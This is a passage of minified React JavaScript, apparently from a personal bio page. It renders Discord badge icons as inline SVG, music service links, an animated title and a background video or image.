1.4254-.05404.2665-.05493.5411-.0026.8079.05232.2669.15682.5208.30751.7471.15068.2264.34458.4208.57057.572.22599.1513.47962.2564.74634.3094zm-1.28-2.3564c.00742-.1825.05112-.3617.12857-.5271s.18709-.3137.32251-.4363c.13542-.1225.29391-.2168.4662-.2775.1723-.0606.35494-.0862.53727-.0754.35402.0768.6634.2902.86088.5939.19747.3037.26707.6731.19366 1.0279-.01513.3614-.17287.7021-.43868.9475-.26581.2453-.61802.3753-.9795.3616-.35825-.0704-.67407-.2798-.87847-.5823-.20441-.3025-.28078-.6736-.21244-1.0323z", fill: "#7687b2" }), (0, c.jsx)("path", { d: "m2.96248 13.3745c.36148.0138.71369-.1162.9795-.3616.2658-.2453.42355-.586.43868-.9474.0734-.3548.0038-.7242-.19367-1.0279-.19748-.3037-.50686-.5171-.86088-.594-.36217-.0118-.71436.1199-.97995.3664s-.42308.588-.43823.95c-.06934.3535.00209.7201.19907 1.0216.19698.3016.50394.5144.85548.5929zm12.16002-6.21814h1.7527c-.2182-.37818-1.4545-2.25454-4.7345-3.04727l-.611-.10909h-.9163c-.4521.0002-.90378.02691-1.35274.08 1.62184.19636 4.25454.86545 5.86184 3.07636z", fill: "#ff903e" }), (0, c.jsx)("circle", { cx: "10.28", cy: "12.75", fill: "#040405", r: "1" })] }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Early Verified Bot Developer":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsx)("path", { d: "m21.58 11.4-4.28-7.39-.35-.6h-9.91l-.35.6-4.27 7.39-.35.6.35.6 4.27 7.39.35.6h9.92l.35-.6 4.28-7.39.35-.6zm-13.07-1.03-1.63 1.63 1.63 1.63v2.73l-4.36-4.36 4.37-4.37v2.74zm3.12 6.93-2.04-.63 3.1-9.98 2.04.64zm3.86-.93v-2.73l1.63-1.64-1.63-1.63v-2.74l4.36 4.37z", fill: "#3e70dd" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Discord Bug Hunter_1":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsxs)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: [(0, c.jsx)("path", { d: "m16.5822 2.63812s7.6721 5.23623 4.7567 12.58868c-2.9154 7.3525-8.7142 5.313-6.5469 3.1648 2.1674-2.1482-2.5573-3.6059-5.58143-6.3935l7.36523-9.35998", fill: "#3ba55c" }), (0, c.jsx)("path", { d: "m16.1155 9.83717c-1.6175 2.05873-3.9 3.08803-5.6646 2.71723l-6.15684 7.8447c-.10362.1324-.23231.243-.37871.3256-.1464.0825-.30764.1354-.47451.1556-.16686.0202-.33606.0073-.49793-.038-.16187-.0452-.31322-.122-.44541-.2258-.13374-.1032-.2457-.2319-.32942-.3786s-.13754-.3086-.15834-.4762c-.02081-.1677-.00819-.3378.03712-.5005s.12242-.3149.22687-.4476l6.12492-7.832c-.81197-1.62394-.36443-4.11099 1.27869-6.18886 2.03946-2.58295 5.11476-3.54836 6.89856-2.15459 1.7837 1.39377 1.5664 4.61607-.4604 7.19902z", fill: "#b4e1cd" })] }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t.split("_")[0] }) }) })] });
              case "Discord Bug Hunter_2":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsxs)("svg", { xmlns: "http://www.w3.org/2000/svg", xmlnsXlink: "http://www.w3.org/1999/xlink", height: "24", viewBox: "0 0 24 24", width: "24", children: [(0, c.jsx)("mask", { id: "a", height: "19", maskUnits: "userSpaceOnUse", width: "16", x: "2", y: "2", children: (0, c.jsx)("path", { d: "m16.1438 9.84735c-1.6048 2.04975-3.9088 3.08265-5.7044 2.70125l-6.14926 7.8813c-.44491.572-1.22351.6356-1.79554.1907-.57203-.445-.63558-1.2235-.25423-1.7956l6.1493-7.8177c-.82626-1.60486-.38135-4.09954 1.28707-6.21286 2.04976-2.57413 5.11646-3.52751 6.91196-2.19278 1.7956 1.33473 1.5413 4.6239-.4449 7.24569z", fill: "#ffd56c" }) }), (0, c.jsx)("path", { d: "m16.5888 2.60168s7.6906 5.25949 4.7351 12.63232c-2.9555 7.3728-8.7235 5.323-6.5307 3.1461s-2.5582-3.591-5.57726-6.4194z", fill: "#ffeac0" }), (0, c.jsx)("path", { d: "m16.1438 9.84735c-1.6048 2.04975-3.9088 3.08265-5.7044 2.70125l-6.14926 7.8813c-.44491.572-1.22351.6356-1.79554.1907-.57203-.445-.63558-1.2235-.25423-1.7956l6.1493-7.8177c-.82626-1.60486-.38135-4.09954 1.28707-6.21286 2.04976-2.57413 5.11646-3.52751 6.91196-2.19278 1.7956 1.33473 1.5413 4.6239-.4449 7.24569z", fill: "#ffd56c" }), (0, c.jsxs)("g", { fill: "#fff", mask: "url(#a)", children: [(0, c.jsx)("path", { d: "m13.0389-1.26782.7405.09754-3.1567 23.96118-.74043-.0976z" }), (0, c.jsx)("path", { d: "m14.2822-1.51801 1.6226.21377-3.1566 23.96114-1.6226-.2137z" })] })] }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t.split("_")[0] }) }) })] });
              case "Discord Certified Moderator":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsx)("path", { d: "m17.2719 3h-9.54383c-.14912 1.9386-1.78947 3.42982-3.72807 3.42982v.89474c0 4.39914 2.08772 8.50004 5.74123 11.40794l2.75877 2.1622 2.7588-2.1622c3.6535-2.8334 5.7412-7.0088 5.7412-11.40794v-.89474c-1.9386 0-3.5044-1.49122-3.7281-3.42982zm-6.4868 12.8991c-2.23685-1.7895-3.57896-4.3245-3.57896-7.08331v-.52193c1.19298 0 2.23684-.89474 2.3114-2.08772h2.98246v11.10966z", fill: "#5865f2" }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Discord Staff":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsxs)("g", { fill: "#5865f2", children: [(0, c.jsx)("path", { d: "m5.92127 6.03526s.22115-.33086.31286-.47743c.09172-.14657-.23743-.49286-.36514-.60257-.12772-.10971-.32914-.05486-.32914-.05486-1.60715.71229-2.41115 2.17372-2.52086 2.466-.10972.29229.27943.61115.56657.76715.132.072.342-.08743.47143-.20572l.04371-.04457.06772-.06857.00085-.00086 4.37229 4.35517.59743-.5975 1.09801-1.098-4.32173-4.43224z" }), (0, c.jsx)("path", { d: "m16.2505 10.6294.2306-.2194 2.0717 2.052c.0146.0129.03.018.0437.018.0395 0 .072-.036.072-.036s2.2937-2.2757 2.3015-2.2834c.0677-.0669 0-.1037 0-.1037l-1.7692-1.78119-.0026.00258-.2425-.23743.1354-.13029.2897.03343-.0548-.384.0728-.07371-.1088-.55372c-.378-.53571-1.4135-1.39371-1.4135-1.39371l-.5417-.09772-.0548.07286-.408-.06086.0394.348.0257.02572-.1209.12171-.6685-.654s-3.8795-2.10686-4.086-2.20457c-.1166-.054-.2023-.09-.2846-.09-.0634 0-.1251.02143-.1963.072-.1646.11571-.0677.34886-.0677.34886l2.412 4.45714.4826.47829-.1509.15085-.0557.05572-.3857-.05315.0591.38229-.1114.11143-.0197-.01972c-.018-.018-.0429-.02742-.0669-.02742s-.048.00942-.0668.02742c-.0369.03686-.0369.09686 0 .13372l.0197.01971-.0532.054-.0137-.01457c-.0188-.018-.0428-.02743-.0668-.02743-.0249 0-.0489.00943-.0669.02743-.0368.03686-.0368.09686 0 .13372l.0146.01457-1.0149 1.02004-.0231-.0232c-.0189-.018-.0429-.0274-.0669-.0274s-.048.0094-.0668.0274c-.0369.0369-.0369.0969 0 .1337l.024.0232-.054.054-.018-.0172c-.018-.0188-.0429-.0283-.066-.0283-.0249 0-.0489.0095-.0677.0283-.036.0369-.036.096 0 .1329l.018.018-.132.1337-.018.1697.0694.0712-.0017.0008-.084.0857-5.47632 5.4755-.07114-.0592-.22714.0326-.12858.1303-.00857-.0086c-.01885-.0189-.04285-.0283-.06685-.0283s-.04886.0094-.06686.0283c-.03686.0369-.03686.096 0 .1329l.01028.0102-.05314.0549-.00514-.0051c-.018-.0189-.04286-.0283-.06686-.0283s-.048.0094-.06686.0283c-.036.0368-.036.096 0 .1328l.006.0069-1.002 1.0191-.02057-.0206c-.01885-.0188-.042-.0274-.06685-.0274-.024 0-.048.0086-.06686.0274-.03686.0369-.03686.0969 0 .1338l.02228.0214-.05314.054-.01628-.0163c-.01886-.018-.04286-.0274-.06772-.0274-.02314 0-.048.0094-.066.0274-.03686.0369-.03686.0969 0 .1337l.01714.018-.07457.0763-.38828-.0694.02914.4337-.12257.1251.10628.5846s.16286.5091.498.8469c.32486.3274.82029.4842.84172.5005l.55971.0977.138-.1354.38572.0626-.06343-.3814.11743-.1149.054.054c.018.018.042.0274.066.0274s.04885-.0094.06685-.0274c.03686-.0377.03686-.0969 0-.1337l-.05314-.0532.05486-.0531.04628.0463c.018.0188.04286.0283.06686.0283s.048-.0095.06686-.0283c.03686-.0369.03686-.096 0-.1329l-.04543-.0463 1.01743-1.0037.04457.0446c.018.0189.04286.0274.06686.0274s.048-.0085.06685-.0274c.036-.0369.036-.0969 0-.1337l-.04371-.0429.054-.054.03771.0377c.018.018.042.0275.066.0275.02486 0 .04886-.0095.06686-.0275.03686-.0368.03686-.0968 0-.1337l-.03686-.0368.114-.1115.04115-.2442-.06086-.0609.00086-.0009.11057-.1097 5.43946-5.4411-.0026-.0052.1063.1098.1706-.0189.1534-.1543.0248.0249c.0189.018.0429.0274.0669.0274s.0489-.0094.0669-.0274c.0368-.0369.0368-.0969 0-.1337l-.0249-.0249.054-.0531.0189.0188c.018.018.042.0274.0668.0274.024 0 .048-.0094.066-.0274.0369-.0368.0369-.0968 0-.1337l-.0188-.0197 1.0165-1.0183.0266.0266c.018.018.042.0274.066.0274.0249 0 .0489-.0094.0669-.0274.0368-.0369.0368-.0969 0-.1337l-.0266-.0266.054-.054.0206.0214c.0188.018.0428.0274.0668.0274s.048-.0094.0669-.0274c.0368-.0377.0368-.0968 0-.1337l-.0206-.0214.1131-.1132.378.0592z" }), (0, c.jsx)("path", { d: "m17.0057 16.7793-2.4111-1.8274-.4294-.4423-1.6637 1.6637.4183.3995 1.5711 2.3562 2.1188 2.3203 2.4421-2.2783z" })] }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "HypeSquad Events":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsxs)("g", { fill: "#fbb848", children: [(0, c.jsx)("path", { d: "m21.5912 6.84349-7.8694 5.16551c-.1351.088-.2444.2103-.317.3543l-1.1997 2.4056c-.0174.0399-.0461.0739-.0825.0977-.0364.0239-.079.0366-.1226.0366s-.0862-.0127-.1226-.0366c-.0364-.0238-.0651-.0578-.0825-.0977l-1.1997-2.4056c-.0726-.144-.1819-.2663-.317-.3543l-7.86944-5.16551c-.03957-.04698-.09618-.07632-.15738-.08157-.0612-.00524-.12198.01404-.16896.0536-.04698.03957-.07633.09618-.08157.15738-.00525.0612.01403.12198.0536.16896l3.28825 6.39624c.01598.0335.02385.0703.02297.1074s-.01049.0734-.02804.1061c-.01756.0327-.04257.0608-.07301.082-.03043.0212-.06544.035-.10219.0402h-1.97668c-.04881-.0005-.0965.0146-.13617.043-.03967.0285-.06926.0688-.08449.1152s-.0153.0964-.00022.1428c.01509.0464.04455.0869.08413.1154l8.8142 6.3155c.0403.0275.088.0422.1368.0422s.0965-.0147.1368-.0422l8.8142-6.3155c.0396-.0285.069-.069.0841-.1154s.015-.0964-.0002-.1428-.0448-.0867-.0845-.1152c-.0396-.0284-.0873-.0435-.1362-.043h-1.9766c-.0389-.0015-.0769-.0126-.1105-.0323-.0335-.0197-.0617-.0474-.082-.0806s-.0321-.071-.0343-.1098c-.0022-.0389.0052-.0777.0216-.113l3.3132-6.39624c.0395-.04698.0588-.10776.0536-.16896-.0053-.0612-.0346-.11781-.0816-.15738-.047-.03956-.1078-.05884-.169-.0536-.0612.00525-.1178.03459-.1574.08157z" }), (0, c.jsx)("path", { d: "m12.1741 2.10696.8081 1.64723c.0143.02721.0346.05084.0594.06913.0247.01829.0533.03078.0835.03654l1.8213.26107c.0356.00524.0691.02036.0966.04366s.0479.05383.0589.08814.0122.07102.0034.10595c-.0089.03494-.0273.06671-.0532.0917l-1.3178 1.28049c-.0213.02203-.0373.04854-.047.07758s-.0127.05988-.009.09025l.3108 1.80885c.0069.03487.0036.07096-.0094.10404-.013.03307-.0351.06174-.0639.08264-.0287.0209-.0628.03315-.0983.03532-.0354.00217-.0708-.00584-.1019-.02309l-1.6285-.85159c-.0265-.01527-.0565-.02331-.0871-.02331-.0305 0-.0605.00804-.087.02331l-1.6286.85159c-.031.01725-.0664.02526-.1019.02309-.0354-.00217-.0695-.01442-.0983-.03532-.0287-.0209-.0509-.04957-.0639-.08264-.0129-.03308-.0162-.06917-.0094-.10404l.3108-1.80885c.0038-.03037.0008-.06121-.0089-.09025s-.0258-.05555-.047-.07758l-1.31781-1.28049c-.02595-.02499-.04438-.05676-.05318-.0917-.00881-.03493-.00764-.07164.00336-.10595s.03141-.06484.05889-.08814c.02749-.0233.06095-.03842.0966-.04366l1.82124-.25485c.0303-.00576.0588-.01825.0836-.03654.0247-.01829.045-.04192.0594-.06913l.8081-1.64723c.015-.03321.0392-.06147.0696-.08149.0305-.02003.066-.03101.1025-.03166.0364-.00065.0723.00905.1035.02798.0311.01893.0563.0463.0725.07895z" })] }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
              case "Partnered Server Owner":
                return (0,
                c.jsxs)("div", { className: "group flex cursor-pointer flex-col items-center justify-center transition-all duration-300 ease-linear", children: [(0, c.jsx)("svg", { xmlns: "http://www.w3.org/2000/svg", height: "24", viewBox: "0 0 24 24", width: "24", children: (0, c.jsxs)("g", { fill: "#5865f2", children: [(0, c.jsx)("path", { d: "m16.6033 9.15179-2.4908 1.66051c-.249.2491-.6642.1661-.7472 0-.2491-.2491-.6642-.4151-.9133-.4982-.6642-.166-1.2454 0-1.7435.2491l-.83027.5812-4.64945 2.9889c-.99631.6642-2.2417.4152-2.9059-.6642-.66421-1.0793-.24908-2.2417.74723-2.8228l5.31365-3.65318c1.49447-.83026 3.23804-1.24539 4.89854-.83026 1.4114.24907 2.6568.99631 3.4871 2.15867.249.16605.249.66421-.1661.83026z" }), (0, c.jsx)("path", { d: "m22 11.6425c0 .7473-.4152 1.4115-.9963 1.7436l-5.4797 3.5701c-.9964.6642-2.2417.9963-3.4041.9963-.4982 0-.9963 0-1.4114-.166-1.41148-.2491-2.49081-1.1624-3.48712-2.1587-.16606-.1661-.16606-.6642.16605-.7473l2.49077-1.6605c.2491-.249.6642-.166.7472 0 .2491.2491.4982.4152.9133.4982.6642.166 1.2454 0 1.7436-.2491l1.2453-.7472 3.7362-2.4908.4982-.41513c.9963-.6642 2.2417-.41512 2.9059.66423.166.4151.3321.7472.3321 1.1623z" })] }) }), (0, c.jsx)("div", { className: "relative flex justify-center z-10", children: (0, c.jsx)("div", { className: "fixed mt-2 scale-0 rounded p-2 text-sm font-semibold text-white shadow-lg transition-all duration-300 group-hover:scale-100", style: { backgroundColor: e.accentcolor + "80" }, children: (0, c.jsx)("p", { className: "hidden w-full max-w-2xl group-hover:block", children: t }) }) })] });
            }
          });
        };
      function k(e) {
        var t = e.bio,
          s = e.musicIndex,
          l = {
            date: new Date(),
            currentMusicIndex: s,
            isMusicPlaying: !1,
            pageTitle: "",
            bigScreen: !1,
          },
          r = (0, a.useState)(l),
          i = r[0],
          n = (i.date, i.currentMusicIndex),
          o = i.isMusicPlaying,
          d = i.pageTitle,
          h = i.bigScreen,
          u = r[1];
        setInterval(function () {
          u(function (e) {
            return z({}, e, { date: new Date() });
          });
        }, 1e3);
        var m = function () {
            u(function (e) {
              return z({}, e, {
                currentMusicIndex:
                  e.currentMusicIndex < t.songs.length - 1
                    ? e.currentMusicIndex + 1
                    : 0,
              });
            });
          },
          f = (0, a.useState)(!t.autoplayfix),
          p = f[0],
          b = f[1],
          k = 0,
          B = t.title,
          Z = t.songs[n];
        (0, a.useEffect)(function () {
          t.animatedTitle
            ? (function e() {
                u(function (e) {
                  return z({}, e, {
                    pageTitle:
                      B.substring(k, B.length) + " " + B.substring(0, k),
                  });
                }),
                  ++k > B.length && (k = 0),
                  setTimeout(function () {
                    return e();
                  }, 150);
              })()
            : t.animatedTitle ||
              u(function (e) {
                return z({}, e, { pageTitle: t.title });
              }),
            window
              .matchMedia("(min-width: 768px)")
              .addEventListener("change", function (e) {
                return u(function (t) {
                  return z({}, t, { bigScreen: e.matches });
                });
              }),
            window.innerWidth > 768
              ? u(function (e) {
                  return z({}, e, { bigScreen: !0 });
                })
              : u(function (e) {
                  return z({}, e, { bigScreen: !1 });
                });
        }, []);
        var S,
          V,
          A,
          H,
          D = (0, a.useRef)(null),
          _ = (0, a.useRef)(null),
          F = new RegExp(/\s/).test(t.description),
          T = function (e) {
            switch (!0) {
              case e.includes("spotify"):
                return (0, c.jsxs)("div", {
                  className: "flex items-center justify-center gap-2",
                  children: [
                    h &&
                      (0, c.jsx)("svg", {
                        xmlns: "http://www.w3.org/2000/svg",
                        width: "16",
                        height: "16",
                        fill: "currentColor",
                        className:
                          "h-7 w-7 text-[#0d5928] duration-300 hover:scale-110",
                        viewBox: "0 0 16 16",
                        children: (0, c.jsx)("path", {
                          d: "M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm3.669 11.538a.498.498 0 0 1-.686.165c-1.879-1.147-4.243-1.407-7.028-.77a.499.499 0 0 1-.222-.973c3.048-.696 5.662-.397 7.77.892a.5.5 0 0 1 .166.686zm.979-2.178a.624.624 0 0 1-.858.205c-2.15-1.321-5.428-1.704-7.972-.932a.625.625 0 0 1-.362-1.194c2.905-.881 6.517-.454 8.986 1.063a.624.624 0 0 1 .206.858zm.084-2.268C10.154 5.56 5.9 5.419 3.438 6.166a.748.748 0 1 1-.434-1.432c2.825-.857 7.523-.692 10.492 1.07a.747.747 0 1 1-.764 1.288z",
                        }),
                      }),
                    "Spotify",
                  ],
                });
              case e.includes("youtube"):
                return (0, c.jsxs)("div", {
                  className: "flex items-center justify-center gap-2",
                  children: [
                    h &&
                      (0, c.jsx)("svg", {
                        xmlns: "http://www.w3.org/2000/svg",
                        width: "16",
                        height: "16",
                        fill: "currentColor",
                        className:
                          "h-7 w-7 text-[#630101] duration-300 hover:scale-110",
                        viewBox: "0 0 16 16",
                        children: (0, c.jsx)("path", {
                          d: "M8.051 1.999h.089c.822.003 4.987.033 6.11.335a2.01 2.01 0 0 1 1.415 1.42c.101.38.172.883.22 1.402l.01.104.022.26.008.104c.065.914.073 1.77.074 1.957v.075c-.001.194-.01 1.108-.082 2.06l-.008.105-.009.104c-.05.572-.124 1.14-.235 1.558a2.007 2.007 0 0 1-1.415 1.42c-1.16.312-5.569.334-6.18.335h-.142c-.309 0-1.587-.006-2.927-.052l-.17-.006-.087-.004-.171-.007-.171-.007c-1.11-.049-2.167-.128-2.654-.26a2.007 2.007 0 0 1-1.415-1.419c-.111-.417-.185-.986-.235-1.558L.09 9.82l-.008-.104A31.4 31.4 0 0 1 0 7.68v-.123c.002-.215.01-.958.064-1.778l.007-.103.003-.052.008-.104.022-.26.01-.104c.048-.519.119-1.023.22-1.402a2.007 2.007 0 0 1 1.415-1.42c.487-.13 1.544-.21 2.654-.26l.17-.007.172-.006.086-.003.171-.007A99.788 99.788 0 0 1 7.858 2h.193zM6.4 5.209v4.818l4.157-2.408L6.4 5.209z",
                        }),
                      }),
                    "Youtube",
                  ],
                });
              case e.includes("twitch"):
                return (0, c.jsxs)("div", {
                  className: "flex items-center justify-center gap-2",
                  children: [
                    h &&
                      (0, c.jsxs)("svg", {
                        xmlns: "http://www.w3.org/2000/svg",
                        width: "16",
                        height: "16",
                        fill: "currentColor",
                        className:
                          "h-7 w-7 text-[#362359] duration-300 hover:scale-110",
                        viewBox: "0 0 16 16",
                        children: [
                          (0, c.jsx)("path", {
                            d: "M3.857 0 1 2.857v10.286h3.429V16l2.857-2.857H9.57L14.714 8V0H3.857zm9.714 7.429-2.285 2.285H9l-2 2v-2H4.429V1.143h9.142v6.286z",
                          }),
                          (0, c.jsx)("path", {
                            d: "M11.857 3.143h-1.143V6.57h1.143V3.143zm-3.143 0H7.571V6.57h1.143V3.143z",
                          }),
                        ],
                      }),
                    "Twitch",
                  ],
                });
              case e.includes("soundcloud"):
                return (0, c.jsxs)("div", {
                  className: "flex items-center justify-center gap-2",
                  children: [
                    h &&
                      (0, c.jsxs)("svg", {
                        fill: "#632e00",
                        xmlns: "http://www.w3.org/2000/svg",
                        viewBox: "0 0 30 30",
                        width: "30px",
                        height: "30px",
                        children: [
                          (0, c.jsx)("path", {
                            d: "M1.448 15.732c-.064 0-.116.051-.125.121l-.295 2.694.295 2.634c.008.07.061.122.125.122.063 0 .114-.05.125-.121l.336-2.635-.336-2.694C1.563 15.782 1.512 15.732 1.448 15.732zM.339 16.763c-.063 0-.112.049-.12.117L0 18.547l.219 1.638c.008.069.058.117.12.117.061 0 .11-.048.12-.116l.26-1.639-.26-1.667C.45 16.812.4 16.763.339 16.763zM2.628 15.203c-.08 0-.142.062-.15.147l-.28 3.197.28 3.08c.007.085.071.147.15.147.078 0 .141-.062.15-.147l.318-3.081-.318-3.197C2.768 15.265 2.706 15.203 2.628 15.203zM3.816 15.091c-.093 0-.169.074-.176.173l-.264 3.284.264 3.177c.008.098.083.173.176.173.092 0 .168-.074.175-.173l.301-3.177-.301-3.285C3.983 15.165 3.908 15.091 3.816 15.091zM5.215 15.5c-.007-.113-.095-.198-.202-.198-.108 0-.195.085-.202.199l-.249 3.047.249 3.203c.007.112.094.199.202.199.107 0 .194-.085.202-.199l.283-3.203L5.215 15.5zM6.221 13.367c-.121 0-.221.098-.227.225L5.76 18.549l.234 3.203c.007.125.106.224.227.224.12 0 .22-.099.227-.225v.001l.265-3.203-.265-4.958C6.441 13.466 6.341 13.367 6.221 13.367zM7.419 12.226c-.136 0-.247.11-.253.25l-.219 6.091.219 3.184C7.172 21.89 7.283 22 7.419 22c.135 0 .247-.11.252-.25v.002l.248-3.184-.247-6.092C7.666 12.335 7.554 12.226 7.419 12.226zM8.665 11.675c-.151 0-.273.122-.278.277l-.204 6.599.204 3.151c.006.154.127.275.278.275.15 0 .272-.121.278-.276v.002l.231-3.151-.231-6.6C8.937 11.797 8.815 11.675 8.665 11.675zM10.206 11.73c-.006-.17-.139-.302-.304-.302-.166 0-.299.133-.304.302l-.189 6.821.189 3.131c.005.168.138.3.304.3.165 0 .298-.132.304-.302l.213-3.129L10.206 11.73zM11.148 11.577c-.181 0-.325.144-.33.328l-.174 6.647.174 3.101c.004.182.149.326.329.326.18 0 .324-.144.329-.328v.002l.196-3.102-.196-6.648C11.472 11.72 11.328 11.577 11.148 11.577zM12.403 11.793c-.195 0-.352.156-.355.353l-.158 6.404.158 3.082c.004.196.159.352.355.352.195 0 .351-.155.355-.353v.003l.178-3.082-.178-6.405C12.755 11.949 12.598 11.793 12.403 11.793zM13.88 10.617c-.061-.041-.133-.065-.21-.065-.075 0-.145.023-.205.062-.104.067-.173.185-.175.318l-.001.072-.143 7.547c0 .005.143 3.064.143 3.064 0 .005.001.008.001.013.005.085.037.164.089.226.07.084.175.138.292.138.103 0 .198-.042.266-.112.068-.068.113-.163.114-.268l.016-.303.144-2.757-.16-7.622C14.048 10.801 13.98 10.685 13.88 10.617z",
                          }),
                          (0, c.jsx)("path", {
                            d: "M14.049 21.615L14.049 21.614 14.049 21.615 14.049 21.613 14.05 21.612 14.049 21.613 14.049 21.614zM15.136 9.894c-.061-.037-.131-.058-.206-.058-.097 0-.187.035-.256.093-.09.074-.148.187-.15.312l-.001.042-.166 8.271.084 1.529.083 1.488c.003.22.185.402.407.402.22 0 .403-.182.406-.405v.004l0 0 .181-3.017 0 0-.181-8.313C15.333 10.094 15.253 9.965 15.136 9.894zM26.31 14.619c-.505 0-.988.102-1.427.287-.293-3.325-3.083-5.934-6.484-5.934-.833 0-1.643.164-2.361.441-.278.108-.352.218-.355.434v11.711c.003.226.178.401.398.424.009.001 10.228 0 10.228 0 2.038 0 3.69-1.634 3.69-3.672C30 16.271 28.348 14.619 26.31 14.619z",
                          }),
                        ],
                      }),
                    "SoundCloud",
                  ],
                });
            }
          },
          P = function (e) {
            switch (!0) {
              case e.includes("spotify"):
                return "#1DB954";
              case e.includes("youtube"):
                return "#FF0000";
              case e.includes("twitch"):
                return "#6441a5";
              case e.includes("soundcloud"):
                return "#ff7700";
            }
          };
        return (0, c.jsxs)(c.Fragment, {
          children: [
            (0, c.jsx)(g(), { children: (0, c.jsx)("title", { children: d }) }),
            t.autoplayfix &&
              (0, c.jsx)("div", {
                className: "".concat(
                  p
                    ? "animate-fadeOut hidden"
                    : "flex h-screen w-screen items-center justify-center hover:cursor-pointer"
                ),
                onClick: function () {
                  var e, t, s;
                  b(!0),
                    null ===
                      (t =
                        null === (e = D.current) || void 0 === e
                          ? void 0
                          : e.audio.current) ||
                      void 0 === t ||
                      t.play(),
                    null === (s = _.current) || void 0 === s || s.play();
                },
                children: "[ Click Anywhere ]",
              }),
            (0, c.jsxs)("div", {
              className: "".concat(
                t.autoplayfix ? "".concat(p ? "animate-fadeIn" : "hidden") : ""
              ),
              children: [
                (0, c.jsx)("div", {
                  className: "fixed z-5 w-screen h-screen",
                  children:
                    "" !== t.background.url &&
                    (function (e) {
                      switch (e.background.type) {
                        case "video":
                          return (0, c.jsxs)("video", {
                            ref: _,
                            autoPlay: p,
                            draggable: !1,
                            loop: !0,
                            muted: !0,
                            playsInline: !0,
                            className: "absolute object-cover w-full h-full",
                            children: [
                              (0, c.jsx)("source", {
                                src: e.background.url,
                                type: "video/mp4",
                              }),
                              "Your browser does not support the video tag.",
                            ],
                          });
                        case "image":
                          return (0, c.jsx)("img", {
                            className: "absolute object-cover w-full h-full",
                            draggable: !1,
                            src: e.background.url,
                          });
                      }
                    })(t),
                }),
                (0, c.jsx)("div", {
                  className: "flex min-h-[90vh] justify-center px-6",
                  children: (0, c.jsxs)("div", {
                    className:
                      "sm:m-auto m-3 w-full z-10 max-w-3xl rounded-lg p-5",
                    style: { backgroundColor: t.primarycolor + "fa" },
                    children: [
                      (0, c.jsxs)("div", {
                        className:
                          "flex items-center gap-4 border-b pb-4 md:flex-nowrap flex-wrap",
                        style: { borderBottomColor: t.accentcolor },
                        children: [
                          (0, c.jsx)("img", {
                            src: t.pfp.url,
                            alt: "",
                            className: "h-24 w-24 rounded-full",
                            draggable: !1,
                          }),
                          (0, c.jsxs)("div", {
                            children: [
                              (0, c.jsxs)("div", {
                                className: "flex flex-row items-center gap-1",
                                children: [
                                  (0, c.jsxs)("svg", {
                                    xmlns: "http://www.w3.org/2000/svg",
                                    width: "16",
                                    height: "16",
                                    fill: "currentColor",
